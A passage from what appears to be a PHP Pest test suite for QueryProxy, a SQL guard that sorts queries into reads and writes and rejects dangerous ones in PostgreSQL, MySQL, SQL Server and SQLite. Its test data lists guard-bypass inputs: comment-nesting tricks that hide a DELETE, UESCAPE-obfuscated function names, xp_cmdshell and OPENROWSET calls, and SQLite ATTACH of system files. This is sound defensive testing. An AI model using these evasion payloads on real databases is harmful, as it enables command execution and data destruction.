    expect(inspect('EXPLAIN SELECT SLEEP(10)', $driver)->type())->toBe(StatementType::Write);
})->with([
    'mysql' => DbDriver::Mysql,
    'unknown driver' => null,
]);

// --- Review round 2: comments read per dialect, EXPLAIN EXECUTE, UESCAPE '\' ---

dataset('comment bypasses', [
    'nested comment hides EXPLAIN option value' => "EXPLAIN (ANALYZE /* /* */ false -- */\n) DELETE FROM t",
    'nested comment hides EXPLAIN option block' => 'EXPLAIN /* /* */ SELECT 1 -- */ (ANALYZE) DELETE FROM t',
    'nested comment hides INTO' => 'SELECT * /* /* */ -- */ INTO t2 FROM t',
    'nested comment hides a blocked call' => 'SELECT 1 /* /* */ -- */, pg_terminate_backend(1)',
    'nested comment hides the leading keyword' => "/* /* */ EXPLAIN -- */\nDELETE FROM t",
    'nested comment hides a second statement' => 'SELECT 1 /* /* */ -- */ ; DELETE FROM t WHERE id = 1',
    'dash comment without a space' => "SELECT 1 --x /*\n, pg_terminate_backend(1) -- */",
]);

test('a PostgreSQL comment cannot hide code from the guard', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes() && $result->type() === StatementType::Read)->toBeFalse();
})->with('comment bypasses');

test('a comment the dialects read differently is rejected when the driver is unknown', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with('comment bypasses');

test('a block comment that is never closed is rejected', function (string $sql, ?DbDriver $driver) {
    expect(inspect($sql, $driver)->passes())->toBeFalse();
})->with([
    'mysql' => ['SELECT 1 /* open', DbDriver::Mysql],
    'pgsql' => ['SELECT 1 /* open', DbDriver::Pgsql],
    'unknown driver' => ['SELECT 1 /* open', null],
    'pgsql, closed only for a flat reading' => ['SELECT 1 /* /* */', DbDriver::Pgsql],
]);

test('a nested PostgreSQL comment is read as one comment', function () {
    $result = inspect('SELECT /* outer /* inner */ still outer */ 1 FROM t', DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read)
        ->and($result->preparedSql())->not->toContain('still outer');
});

test('a PostgreSQL comment both readings agree on is kept', function () {
    $result = inspect("SELECT 1 /* trace */ FROM t -- note\n", DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->preparedSql())->toContain('/* trace */')
        ->and($result->preparedSql())->toContain('-- note');
});

test('a comment opener inside a dollar-quoted string is not a comment', function () {
    expect(inspect('SELECT $$/*$$ FROM t', DbDriver::Pgsql)->passes())->toBeTrue();
});

test('a MySQL block comment ends at its first closing marker', function () {
    expect(inspect('SELECT 1 /* /* */, SLEEP(1)', DbDriver::Mysql)->type())->toBe(StatementType::Write);
});

test('a nested comment in a DO block body cannot hide a forbidden statement', function () {
    expect(inspect('DO $$ BEGIN /* /* */ -- */ DROP DATABASE prod; END $$', DbDriver::Pgsql)->passes())->toBeFalse();
});

test('EXPLAIN EXECUTE judges the calls in its parameters', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'plain' => 'EXPLAIN EXECUTE p(pg_terminate_backend(123))',
    'with an option list' => 'EXPLAIN (FORMAT JSON) EXECUTE p(pg_terminate_backend(123))',
    'in a transaction' => 'BEGIN; PREPARE p(int) AS SELECT $1; EXPLAIN EXECUTE p(pg_terminate_backend(123)); COMMIT;',
]);

test('EXPLAIN EXECUTE with a state-changing parameter is a write', function () {
    expect(inspect("EXPLAIN EXECUTE p(nextval('s'))", DbDriver::Pgsql)->type())->toBe(StatementType::Write);
});

test('a U& name escaped with UESCAPE backslash is rejected', function () {
    expect(inspect("SELECT U&\"pg\\005fterminate\\005fbackend\" UESCAPE '\\' (1)", DbDriver::Pgsql)->passes())->toBeFalse();
});

// --- Review round 3: EXECUTE anywhere under EXPLAIN, any UESCAPE, "$" in identifiers ---

test('EXPLAIN of CREATE TABLE AS EXECUTE judges the calls in its parameters', function () {
    expect(inspect('EXPLAIN CREATE TABLE x AS EXECUTE p(pg_terminate_backend(1))', DbDriver::Pgsql)->passes())->toBeFalse()
        ->and(inspect("EXPLAIN CREATE TEMP TABLE x AS EXECUTE p(nextval('s'))", DbDriver::Pgsql)->type())->toBe(StatementType::Write);
});

test('any UESCAPE clause is rejected', function (string $sql, ?DbDriver $driver) {
    expect(inspect($sql, $driver)->passes())->toBeFalse();
})->with([
    'E-string escape' => ["SELECT U&\"pg!005fterminate!005fbackend\" UESCAPE E'!' (1)", DbDriver::Pgsql],
    'E-string backslash' => ["SELECT U&\"pg\\005fterminate\\005fbackend\" UESCAPE E'\\\\' (1)", DbDriver::Pgsql],
    'dollar-quoted escape' => ['SELECT U&"pg!005fterminate!005fbackend" UESCAPE $$!$$ (1)', DbDriver::Pgsql],
    'tagged dollar-quoted escape' => ['SELECT U&"pg!005fterminate!005fbackend" UESCAPE $q$!$q$ (1)', DbDriver::Pgsql],
    'plain escape' => ["SELECT U&\"pg!005fterminate!005fbackend\" UESCAPE '!' (1)", DbDriver::Pgsql],
    'on a column, not a call' => ["SELECT U&\"col\" UESCAPE '\\' FROM t", DbDriver::Pgsql],
    'resource call' => ["SELECT U&\"pg!005fsleep\" UESCAPE '!' (10)", DbDriver::Pgsql],
    'unknown driver' => ["SELECT U&\"pg!005fterminate!005fbackend\" UESCAPE '!' (1)", null],
]);

test('a UESCAPE rejection names the clause, not a function', function () {
    expect(inspect("SELECT U&\"col\" UESCAPE '\\' FROM t", DbDriver::Pgsql)->violations)
        ->toBe(['A UESCAPE clause is not allowed through QueryProxy; write Unicode escapes with the default backslash escape.']);
});

test('a "$" that continues an identifier does not open a dollar quote', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes() && $result->type() === StatementType::Read)->toBeFalse();
})->with([
    'hides a blocked call' => 'SELECT 1 AS a$$, pg_terminate_backend(1) -- $$',
    'hides a resource-consuming call' => 'SELECT 1 AS a$$, pg_sleep(10) -- $$',
    'hides INTO' => 'SELECT 1 AS a$$ INTO t2 -- $$',
    'hides INTO under EXPLAIN ANALYZE' => 'EXPLAIN ANALYZE SELECT 1 AS a$$ INTO t2 -- $$',
]);

test('a dollar quote the guard cannot delimit like PostgreSQL is rejected', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'never closed' => 'SELECT $q$ open, pg_terminate_backend(1)',
    'after a backslash-ended string' => "SELECT 'a\\', \$\$ x \$\$ FROM t",
]);

test('an identifier with a "$" and a real dollar quote still read', function () {
    expect(inspect('SELECT a$b, $$text$$ FROM t', DbDriver::Pgsql)->passes())->toBeTrue();
});

test('CREATE TABLE AS EXECUTE judges the calls in its parameters in every form', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'plain' => 'CREATE TABLE x AS EXECUTE p(pg_terminate_backend(1))',
    'under EXPLAIN ANALYZE' => 'EXPLAIN ANALYZE CREATE TABLE x AS EXECUTE p(pg_terminate_backend(1))',
    'under an EXPLAIN option list' => 'EXPLAIN (VERBOSE) CREATE TEMP TABLE x AS EXECUTE p(pg_terminate_backend(1))',
]);

// --- SQL Server and SQLite dialect guards ---

test('SQL Server system procedures, remote rowsets and BULK INSERT are rejected', function (string $sql) {
    $result = inspect($sql, DbDriver::Sqlsrv);

    expect($result->passes())->toBeFalse()
        ->and($result->violations)->not->toBeEmpty();
})->with([
    'xp_cmdshell' => "EXEC xp_cmdshell 'dir'",
    'xp_cmdshell, EXECUTE' => "EXECUTE xp_cmdshell 'dir'",
    'xp_cmdshell, lower case' => "exec XP_CMDSHELL 'dir'",
    'xp_cmdshell, without EXEC' => "xp_cmdshell 'dir'",
    'xp_cmdshell, schema-qualified' => "EXEC master..xp_cmdshell 'dir'",
    'xp_cmdshell, bracketed' => "EXEC [master].[dbo].[xp_cmdshell] 'dir'",
    'xp_cmdshell, bracketed without a space' => "EXEC[xp_cmdshell] 'dir'",
    'xp_cmdshell, return value captured' => "EXEC @rc = xp_cmdshell 'dir'",
    'xp_cmdshell, after a comment' => "EXEC /* c */ xp_cmdshell 'dir'",
    'xp_regread' => "EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'x'",
    'sp_configure' => "EXEC sp_configure 'show advanced options', 1",
    'sp_OACreate' => "EXEC sp_OACreate 'WScript.Shell', @o OUT",
    'sp_addlinkedserver' => "EXEC sp_addlinkedserver 'remote'",
    'OPENROWSET' => "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=x;Trusted_Connection=yes;', 'SELECT 1')",
    'OPENROWSET, lower case' => "select * from openrowset(BULK 'c:\\x.csv', SINGLE_CLOB) AS t",
    'OPENDATASOURCE' => "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Data Source=x').db.dbo.t",
    'OPENQUERY' => "SELECT * FROM OPENQUERY(remote, 'SELECT 1')",
    'BULK INSERT' => "BULK INSERT t FROM 'c:\\x.csv'",
    'BULK INSERT, lower case' => "bulk insert t from 'c:\\x.csv'",
    'sp_addlinkedsrvlogin' => "EXEC sp_addlinkedsrvlogin 'remote', 'false', NULL, 'sa', 'x'",
    'sp_execute_external_script' => "EXEC sp_execute_external_script @language = N'Python', @script = N'x'",
]);

test('the SQL Server rules hold anywhere in the statement, not just at its head', function (string $sql) {
    expect(inspect($sql, DbDriver::Sqlsrv)->passes())->toBeFalse();
})->with([
    'BULK INSERT inside IF' => "IF 1 = 1 BULK INSERT t FROM 'c:\\x.csv'",
    'BULK INSERT inside BEGIN TRY' => "BEGIN TRY BULK INSERT t FROM 'c:\\x.csv' END TRY BEGIN CATCH END CATCH",
    'BULK INSERT after a SELECT without a semicolon' => "SELECT 1 BULK INSERT t FROM 'c:\\x.csv'",
    'procedure after a SELECT without a semicolon' => "SELECT 1 EXEC xp_cmdshell 'dir'",
    'procedure inside IF' => "IF 1 = 1 EXEC xp_cmdshell 'dir'",
]);

test('an EXEC whose module cannot be read is rejected', function (string $sql) {
    $result = inspect($sql, DbDriver::Sqlsrv);

    expect($result->passes())->toBeFalse()
        ->and($result->violations)->not->toBeEmpty();
})->with([
    'module in a variable' => "DECLARE @p sysname = N'xp_cmdshell' EXEC @p 'dir'",
    'module in a variable, return value captured' => "EXEC @rc = @p 'dir'",
    'incomplete name' => "EXEC ..xp_cmdshell 'dir'",
    'nothing to execute' => 'SELECT 1 EXEC',
    'N-prefixed string' => "EXEC N'xp_cmdshell'",
    'N, a space and a string' => "EXEC N 'xp_cmdshell'",
    'string literal' => "EXEC 'xp_cmdshell'",
    'quoted name' => 'EXEC "xp_cmdshell"',
    'name glued to a string' => "EXEC sp_who'active'",
    'expression' => 'EXEC 1 + 1',
]);

test('an EXEC of a plain or dotted module name is readable', function (string $sql) {
    expect(implode("\n", inspect($sql, DbDriver::Sqlsrv)->violations))->not->toContain('EXEC with a module');
})->with([
    'bare name with an argument' => "EXEC sp_who 'active'",
    'dotted name with an N string argument' => "EXEC dbo.report N'2026'",
    'bracketed parts' => 'EXEC [dbo].[report]',
    'return value captured' => 'EXEC @rc = dbo.report',
]);

test('EXECUTE as a granted privilege is not an unreadable EXEC', function () {
    expect(inspect('GRANT SELECT, EXECUTE ON SCHEMA::dbo TO app', DbDriver::Sqlsrv)->violations)
        ->each->not->toStartWith('EXEC with a module QueryProxy cannot read');
});

test('the SQL Server rules apply whatever the driver', function (?DbDriver $driver) {
    expect(inspect("EXEC xp_cmdshell 'dir'", $driver)->passes())->toBeFalse()
        ->and(inspect("SELECT * FROM OPENQUERY(remote, 'SELECT 1')", $driver)->passes())->toBeFalse();
})->with([
    'no driver' => null,
    'mysql' => DbDriver::Mysql,
    'pgsql' => DbDriver::Pgsql,
    'sqlite' => DbDriver::Sqlite,
]);

test('a dangerous SQL Server name in a literal, a comment or a column is not a call', function (string $sql) {
    $result = inspect($sql, DbDriver::Sqlsrv);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read);
})->with([
    'string literal' => "SELECT 'xp_cmdshell'",
    'string literal naming a rowset' => "SELECT 'OPENROWSET(x)' AS note",
    'comment' => 'SELECT 1 /* EXEC xp_cmdshell */',
    'column with the prefix' => 'SELECT xp_points FROM players',
]);

test('the blocked procedure list can be extended from configuration', function () {
    config(['queryproxy.blocked_procedures' => ['sp_who2']]);

    expect(inspect('EXEC sp_who2', DbDriver::Sqlsrv)->passes())->toBeFalse()
        // The floor stays even when configuration leaves it out.
        ->and(inspect("EXEC xp_cmdshell 'dir'", DbDriver::Sqlsrv)->passes())->toBeFalse();
});

test('a top-level SQL Server SELECT without TOP gets the default TOP', function (string $sql, string $prepared) {
    $statement = inspect($sql, DbDriver::Sqlsrv)->statements[0];

    expect($statement->preparedSql)->toBe($prepared)
        ->and($statement->limitInjected)->toBeTrue()
        ->and($statement->limitClamped)->toBeFalse();
})->with([
    'plain' => ['SELECT * FROM t', 'SELECT TOP (1000) * FROM t'],
    'DISTINCT' => ['SELECT DISTINCT a FROM t', 'SELECT DISTINCT TOP (1000) a FROM t'],
    'ALL' => ['SELECT ALL a FROM t', 'SELECT ALL TOP (1000) a FROM t'],
    'lower case' => ['select a from t', 'select TOP (1000) a from t'],
    'TOP only in a subquery' => [
        'SELECT * FROM (SELECT TOP 5 a FROM t) x',
        'SELECT TOP (1000) * FROM (SELECT TOP 5 a FROM t) x',
    ],
    'bracketed [top] column' => ['SELECT [top] FROM t', 'SELECT TOP (1000) [top] FROM t'],
    'bracketed [offset] column' => ['SELECT [offset] FROM t', 'SELECT TOP (1000) [offset] FROM t'],
    'bracketed [fetch] column' => ['SELECT [fetch] FROM t', 'SELECT TOP (1000) [fetch] FROM t'],
    'bracketed [union] column' => ['SELECT [union] FROM t', 'SELECT TOP (1000) [union] FROM t'],
    'bracketed [except] column' => ['SELECT [except] FROM t', 'SELECT TOP (1000) [except] FROM t'],
    'TOP only in a comment' => ['SELECT a /* TOP 5 */ FROM t', 'SELECT TOP (1000) a /* TOP 5 */ FROM t'],
]);

test('SQL Server statements the default TOP cannot bound are left alone', function (string $sql) {
    $statement = inspect($sql, DbDriver::Sqlsrv)->statements[0];

    expect($statement->preparedSql)->toBe($sql)
        ->and($statement->limitInjected)->toBeFalse();
})->with([
    'OFFSET ... FETCH' => 'SELECT a FROM t ORDER BY a OFFSET 0 ROWS FETCH NEXT 10 ROWS ONLY',
    'OFFSET without FETCH' => 'SELECT a FROM t ORDER BY a OFFSET 10 ROWS',
    'UNION' => 'SELECT a FROM t UNION ALL SELECT a FROM u',
    'EXCEPT' => 'SELECT a FROM t EXCEPT SELECT a FROM u',
    'INTERSECT' => 'SELECT a FROM t INTERSECT SELECT a FROM u',
    'lower case except' => 'select a from t except select a from u',
    'CTE' => 'WITH x AS (SELECT a FROM t) SELECT a FROM x',
]);

test('SELECT INTO on SQL Server is a write and gets no TOP', function () {
    $result = inspect('SELECT * INTO t2 FROM t', DbDriver::Sqlsrv);

    expect($result->type())->toBe(StatementType::Write)
        ->and($result->statements[0]->limitInjected)->toBeFalse();
});

test('a SQL Server TOP within the hard cap is untouched', function (string $sql) {
    $statement = inspect($sql, DbDriver::Sqlsrv)->statements[0];

    expect($statement->preparedSql)->toBe($sql)
        ->and($statement->limitInjected)->toBeFalse()
        ->and($statement->limitClamped)->toBeFalse();
})->with([
    'bare' => 'SELECT TOP 50 * FROM t',
    'parenthesised' => 'SELECT TOP (50) * FROM t',
    'DISTINCT' => 'SELECT DISTINCT TOP 50 a FROM t',
]);

test('a SQL Server TOP above the hard cap is clamped', function (string $sql, string $prepared) {
    $result = inspect($sql, DbDriver::Sqlsrv);

    expect($result->passes())->toBeTrue()
        ->and($result->statements[0]->preparedSql)->toBe($prepared)
        ->and($result->statements[0]->limitClamped)->toBeTrue();
})->with([
    'bare' => ['SELECT TOP 50000 * FROM t', 'SELECT TOP 10000 * FROM t'],
    'parenthesised' => ['SELECT TOP (50000) * FROM t', 'SELECT TOP (10000) * FROM t'],
    'after a comment naming TOP' => [
        'SELECT /* TOP 5 */ TOP 50000 * FROM t',
        'SELECT /* TOP 5 */ TOP 10000 * FROM t',
    ],
]);

test('a SQL Server TOP the guard cannot read is rejected', function (string $sql) {
    expect(inspect($sql, DbDriver::Sqlsrv)->passes())->toBeFalse();
})->with([
    'PERCENT' => 'SELECT TOP 10 PERCENT * FROM t',
    'PERCENT, parenthesised' => 'SELECT TOP (10) PERCENT * FROM t',
    'variable' => 'SELECT TOP (@n) * FROM t',
    'expression' => 'SELECT TOP (5 + 5) * FROM t',
    'decimal' => 'SELECT TOP (1.5) * FROM t',
]);

test('SQLite constructs that reach another file or native code are rejected', function (string $sql) {
    $result = inspect($sql, DbDriver::Sqlite);

    expect($result->passes())->toBeFalse()
        ->and($result->violations)->not->toBeEmpty();
})->with([
    'ATTACH' => "ATTACH DATABASE '/etc/x' AS x",
    'ATTACH, lower case' => "attach '/etc/x' as x",
    'DETACH' => 'DETACH DATABASE x',
    'load_extension' => "SELECT load_extension('x')",
    'load_extension, upper case' => "SELECT LOAD_EXTENSION('x', 'entry')",
    'VACUUM INTO' => "VACUUM INTO '/tmp/x'",
    'VACUUM schema INTO' => "VACUUM main INTO '/tmp/x'",
    'PRAGMA assignment' => 'PRAGMA writable_schema = 1',
    'PRAGMA assignment, allowed name' => 'PRAGMA table_info = 1',
    'PRAGMA not on the list' => 'PRAGMA journal_mode',
    'PRAGMA not on the list, call form' => 'PRAGMA wal_checkpoint(TRUNCATE)',
    'EXPLAIN PRAGMA assignment' => 'EXPLAIN PRAGMA writable_schema = 1',
    'EXPLAIN QUERY PLAN PRAGMA assignment' => 'EXPLAIN QUERY PLAN PRAGMA writable_schema = 1',
    'EXPLAIN PRAGMA not on the list' => 'EXPLAIN PRAGMA journal_mode',
    'EXPLAIN ATTACH' => "EXPLAIN ATTACH DATABASE '/etc/x' AS x",
    'EXPLAIN QUERY PLAN ATTACH' => "EXPLAIN QUERY PLAN ATTACH '/etc/x' AS x",
    'EXPLAIN DETACH' => 'EXPLAIN DETACH x',
    'EXPLAIN VACUUM INTO' => "EXPLAIN VACUUM INTO '/tmp/x'",
]);

test('SQLite command words used as column names are not commands', function (string $sql) {
    $result = inspect($sql, DbDriver::Sqlite);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read);
})->with([
    'attach column' => 'SELECT attach FROM t',
    'attach column with an alias' => 'SELECT attach AS a, detach FROM t',
    'pragma column in a condition' => 'SELECT a FROM t WHERE pragma = 1',
]);

test('a SQLite command word in a command position is rejected whatever follows it', function (string $sql) {
    expect(inspect($sql, DbDriver::Sqlite)->passes())->toBeFalse();
})->with([
    'ATTACH, unary plus' => "ATTACH +'/tmp/e.db' AS x",
    'ATTACH, unary minus' => "ATTACH -'/tmp/e.db' AS x",
    'ATTACH, bitwise not' => "ATTACH ~'/tmp/e.db' AS x",
    'ATTACH, NOT' => "ATTACH NOT '/tmp/e.db' AS x",
    'ATTACH, comment then unary plus' => "ATTACH -- c\n+'/tmp/e.db' AS x",
    'ATTACH, parenthesised file' => "ATTACH ('/tmp/e.db') AS x",
    'DETACH, bracketed schema' => 'DETACH [x]',
    'VACUUM, bracketed schema' => "VACUUM [main] INTO '/tmp/v.db'",
    'VACUUM, bracketed temp schema' => "VACUUM [temp] INTO '/tmp/v.db'",
    'VACUUM, quoted schema' => "VACUUM \"main\" INTO '/tmp/v.db'",
    'VACUUM, backticked schema' => "VACUUM `main` INTO '/tmp/v.db'",
    'PRAGMA after a value' => 'SELECT 1 PRAGMA writable_schema = 1',
]);

/*
 * Every input the anchored patterns this phase replaced —
 * /^(ATTACH|DETACH)\b/i, /^VACUUM\b.*\bINTO\b/i and /^BULK\s+INSERT\b/i over
 * the normalized statement — rejected must stay rejected.
 */
dataset('former sqlite command patterns', [
    'ATTACH DATABASE' => "ATTACH DATABASE '/tmp/e.db' AS x",
    'ATTACH' => "ATTACH '/tmp/e.db' AS x",
    'ATTACH, lower case' => "attach '/tmp/e.db' as x",
    'ATTACH, unary plus' => "ATTACH +'/tmp/e.db' AS x",
    'ATTACH, unary minus' => "ATTACH -'/tmp/e.db' AS x",
    'ATTACH, bitwise not' => "ATTACH ~'/tmp/e.db' AS x",
    'ATTACH, NOT' => "ATTACH NOT '/tmp/e.db' AS x",
    'ATTACH, comment inside' => "ATTACH /* c */ '/tmp/e.db' AS x",
    'ATTACH, line comment inside' => "ATTACH -- c\n+'/tmp/e.db' AS x",
    'ATTACH, parenthesised file' => "ATTACH('/tmp/e.db') AS x",
    'ATTACH, quoted file' => 'ATTACH "/tmp/e.db" AS x',
    'ATTACH, concatenated file' => "ATTACH '/tmp/' || 'e.db' AS x",
    'ATTACH, identifier file' => 'ATTACH x AS y',
    'ATTACH, dot after it' => 'ATTACH.x',
    'ATTACH alone' => 'ATTACH',
    'DETACH' => 'DETACH x',
    'DETACH DATABASE' => 'DETACH DATABASE x',
    'DETACH, quoted schema' => 'DETACH "x"',
    'DETACH, bracketed schema' => 'DETACH [x]',
    'DETACH, lower case' => 'detach x',
    'DETACH alone' => 'DETACH',
    'VACUUM INTO' => "VACUUM INTO '/tmp/v.db'",
    'VACUUM INTO, lower case' => "vacuum into '/tmp/v.db'",
    'VACUUM schema INTO' => "VACUUM main INTO '/tmp/v.db'",
    'VACUUM bracketed schema INTO' => "VACUUM [main] INTO '/tmp/v.db'",
    'VACUUM bracketed temp schema INTO' => "VACUUM [temp] INTO '/tmp/v.db'",
    'VACUUM quoted schema INTO' => "VACUUM \"main\" INTO '/tmp/v.db'",
    'VACUUM backticked schema INTO' => "VACUUM `main` INTO '/tmp/v.db'",
    'VACUUM, comment before INTO' => "VACUUM /* c */ INTO '/tmp/v.db'",
    'VACUUM, line break before INTO' => "VACUUM\nINTO '/tmp/v.db'",
    'VACUUM INTO, unary plus' => "VACUUM INTO +'/tmp/v.db'",
    'VACUUM INTO, parenthesised file' => "VACUUM INTO('/tmp/v.db')",
    'VACUUM INTO, concatenated file' => "VACUUM main INTO '/tmp/' || 'v.db'",
]);

dataset('former bulk insert patterns', [
    'BULK INSERT' => "BULK INSERT t FROM 'c:\\x.csv'",
    'BULK INSERT, lower case' => "bulk insert t from 'c:\\x.csv'",
    'BULK INSERT, several spaces' => "BULK    INSERT t FROM 'c:\\x.csv'",
    'BULK INSERT, line break' => "BULK\nINSERT t FROM 'c:\\x.csv'",
    'BULK INSERT, comment between' => "BULK /* c */ INSERT t FROM 'c:\\x.csv'",
    'BULK INSERT, bracketed table' => "BULK INSERT [dbo].[t] FROM 'c:\\x.csv'",
    'BULK INSERT, quoted table' => "BULK INSERT \"t\" FROM 'c:\\x.csv'",
]);

test('what the former SQLite command patterns rejected stays rejected', function (string $sql, ?DbDriver $driver) {
    expect(inspect($sql, $driver)->passes())->toBeFalse();
})->with('former sqlite command patterns')->with([
    'sqlite' => DbDriver::Sqlite,
    'no driver' => null,
]);

test('what the former BULK INSERT pattern rejected stays rejected', function (string $sql, ?DbDriver $driver) {
    expect(inspect($sql, $driver)->passes())->toBeFalse();
})->with('former bulk insert patterns')->with([
    'sqlsrv' => DbDriver::Sqlsrv,
    'no driver' => null,
]);

test('the SQLite command words are ordinary identifiers in other dialects', function (string $sql, DbDriver $driver) {
    $violations = implode("\n", inspect($sql, $driver)->violations);

    expect($violations)->not->toContain('ATTACH')
        ->and($violations)->not->toContain('VACUUM')
        ->and($violations)->not->toContain('PRAGMA');
})->with([
    'table named attach' => 'SELECT * FROM attach a',
    'column named attach with an alias' => 'SELECT attach x FROM t',
    'joined table named detach' => 'SELECT a FROM t JOIN detach d ON 1=1',
    'column named vacuum selected into a variable' => 'SELECT vacuum INTO @v FROM t',
    'leading command word' => 'SELECT 1 FROM t WHERE 1 = 1 ORDER BY attach',
])->with([
    'mysql' => DbDriver::Mysql,
    'pgsql' => DbDriver::Pgsql,
]);

test('SQLite command words in an identifier position are not commands', function (string $sql) {
    $violations = implode("\n", inspect($sql, DbDriver::Sqlite)->violations);

    expect($violations)->not->toContain('ATTACH')
        ->and($violations)->not->toContain('VACUUM')
        ->and($violations)->not->toContain('PRAGMA');
})->with([
    'table and columns named after commands' => 'CREATE TABLE attach (pragma int, vacuum int)',
    'insert into a table named attach' => 'INSERT INTO attach VALUES (1)',
    'update of command-named columns' => 'UPDATE t SET vacuum = 1 WHERE pragma = 2',
    'join of command-named tables' => 'SELECT * FROM attach a LEFT JOIN detach d ON a.id = d.id',
]);

test('a comment SQLite or SQL Server reads differently from the guard is rejected', function (string $sql, DbDriver $driver) {
    expect(inspect($sql, $driver)->passes())->toBeFalse();
})->with([
    'sqlite, -- without a space hides a SELECT' => ["--x SELECT\nATTACH '/tmp/e.db' AS x", DbDriver::Sqlite],
    'sqlite, -- without a space' => ["--x\nATTACH '/tmp/e.db' AS x", DbDriver::Sqlite],
    'sqlite, # is not a comment' => ["SELECT 1 # x\n", DbDriver::Sqlite],
    'sqlsrv, -- without a space hides a SELECT' => ["--x SELECT\nEXEC xp_cmdshell 'dir'", DbDriver::Sqlsrv],
    'sqlsrv, -- glued to a number' => ['SELECT 1--1', DbDriver::Sqlsrv],
    'sqlsrv, nested block comment' => ["/* /* */ SELECT ' */ EXEC xp_cmdshell ''dir'' --'", DbDriver::Sqlsrv],
]);

test('comments both readings agree on still pass', function (string $sql, DbDriver $driver) {
    expect(inspect($sql, $driver)->passes())->toBeTrue();
})->with([
    'sqlite, line comment' => ["SELECT 1 -- note\n", DbDriver::Sqlite],
    'sqlite, double minus with a space' => ['SELECT 1 - -1', DbDriver::Sqlite],
    'sqlsrv, block comment' => ['SELECT 1 /* note */', DbDriver::Sqlsrv],
    'sqlsrv, temporary table ending its line' => ["SELECT * FROM #orders\nWHERE id = 1", DbDriver::Sqlsrv],
    'sqlsrv, global temporary table ending the statement' => ['SELECT * FROM ##orders', DbDriver::Sqlsrv],
]);

test('a SQLite name in a literal or a comment is not a call', function (string $sql) {
    $result = inspect($sql, DbDriver::Sqlite);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read);
})->with([
    'string literal' => "SELECT 'load_extension(x)'",
    'comment' => 'SELECT 1 -- ATTACH DATABASE x',
]);

test('read-only SQLite pragmas pass as reads', function (string $sql) {
    $result = inspect($sql, DbDriver::Sqlite);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read);
})->with([
    'table_info' => 'PRAGMA table_info(users)',
    'schema-qualified' => 'PRAGMA main.table_info(users)',
    'lower case keyword' => 'pragma INDEX_LIST(users)',
    'no argument' => 'PRAGMA compile_options',
    'database_list' => 'PRAGMA database_list',
]);

test('VACUUM without INTO is not mistaken for VACUUM INTO', function () {
    expect(inspect('VACUUM', DbDriver::Sqlite)->violations)->toBeEmpty();
});

test('the SQLite pragma allowlist can be extended from configuration', function () {
    config(['queryproxy.sqlite_allowed_pragmas' => ['user_version']]);

    expect(inspect('PRAGMA user_version', DbDriver::Sqlite)->passes())->toBeTrue()
        ->and(inspect('PRAGMA user_version = 3', DbDriver::Sqlite)->passes())->toBeFalse()
        // The call form of an added pragma sets it, just like "= v".
        ->and(inspect('PRAGMA user_version(3)', DbDriver::Sqlite)->passes())->toBeFalse()
        // The floor stays even when configuration leaves it out.
        ->and(inspect('PRAGMA table_info(users)', DbDriver::Sqlite)->passes())->toBeTrue();
});

test('a SQL Server batch without semicolons is judged statement by statement', function (string $sql, string $violation) {
    $result = inspect($sql, DbDriver::Sqlsrv);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain($violation);
})->with([
    'DELETE after a SELECT' => ['SELECT 1 DELETE FROM t', 'DELETE without a WHERE clause'],
    'UPDATE after a SELECT' => ['SELECT 1 UPDATE t SET a = 1', 'UPDATE without a WHERE clause'],
    'DELETE after IF' => ['IF 1 = 1 DELETE FROM t', 'DELETE without a WHERE clause'],
    'DELETE after IF ... ELSE' => ['IF 1 = 1 SELECT 1 ELSE DELETE FROM t', 'DELETE without a WHERE clause'],
    'DELETE inside BEGIN ... END' => ['IF 1 = 1 BEGIN SELECT 1 DELETE FROM t END', 'DELETE without a WHERE clause'],
    'DELETE inside TRY ... CATCH' => ['BEGIN TRY DELETE FROM t END TRY BEGIN CATCH SELECT 1 END CATCH', 'DELETE without a WHERE clause'],
    'DELETE after WHILE' => ['WHILE 1 = 1 DELETE FROM t', 'DELETE without a WHERE clause'],
    'DELETE after DECLARE' => ['DECLARE @x int = 1 DELETE FROM t', 'DELETE without a WHERE clause'],
    'DELETE after SET ... ON' => ['SET NOCOUNT ON DELETE FROM t', 'DELETE without a WHERE clause'],
    'DELETE after a CTE query' => ['WITH c AS (SELECT 1 a) SELECT * FROM c DELETE FROM t', 'DELETE without a WHERE clause'],
    'EXEC after a temporary table' => ["SELECT 1 FROM #t EXEC xp_cmdshell 'dir'", 'xp_cmdshell'],
    'blocked function after a SELECT' => ['SELECT 1 SELECT 2 FROM t WHERE 1 = 1 UPDATE t SET a = 1', 'UPDATE without a WHERE clause'],
]);

test('a statement after a SELECT in a SQL Server batch decides its class', function () {
    $drop = inspect('SELECT 1 DROP DATABASE x', DbDriver::Sqlsrv);
    $merge = inspect('MERGE t USING s ON t.id = s.id WHEN MATCHED THEN DELETE DROP TABLE x', DbDriver::Sqlsrv);
    $delete = inspect('SELECT 1 DELETE FROM t WHERE id = 1', DbDriver::Sqlsrv);

    expect($drop->passes())->toBeFalse()
        ->and($drop->hasDdl())->toBeTrue()
        ->and($merge->hasDdl())->toBeTrue()
        ->and($merge->type())->toBe(StatementType::Write)
        ->and($delete->passes())->toBeTrue()
        ->and($delete->type())->toBe(StatementType::Write)
        // A write batch runs as written: no TOP is added to its SELECT.
        ->and($delete->statements[0]->preparedSql)->toBe('SELECT 1 DELETE FROM t WHERE id = 1');
});

test('a SQL Server batch whose statement boundaries are unclear is rejected', function (string $sql) {
